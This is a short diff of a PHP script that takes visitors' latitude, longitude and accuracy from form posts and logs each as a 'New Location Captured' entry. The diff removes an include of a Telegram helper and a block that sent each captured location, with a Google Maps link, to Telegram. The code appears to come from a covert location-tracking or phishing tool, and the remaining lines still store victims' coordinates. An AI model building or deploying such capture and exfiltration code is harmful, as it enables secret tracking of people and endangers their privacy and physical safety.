@@ -1,6 +1,6 @@
 <?php
-include 'telegram_helper.php';
 $date = date('dMYHis');
+
 
 $latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
 $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
@@ -40,13 +40,6 @@ if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
             if ($fp) {
                 fwrite($fp, "\n=== New Location Captured ===\n" . $data . "\n");
                 fclose($fp);
-                
-                $msg = "<b>Location Received!</b>\n";
-                $msg .= "Latitude: " . $latitude . "\n";
-                $msg .= "Longitude: " . $longitude . "\n";
-                $msg .= "Accuracy: " . $accuracy . " meters\n";
-                $msg .= "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude;
-                sendTelegramMessage($msg);
             }
             
             // Create saved_locations directory if it doesn't exist
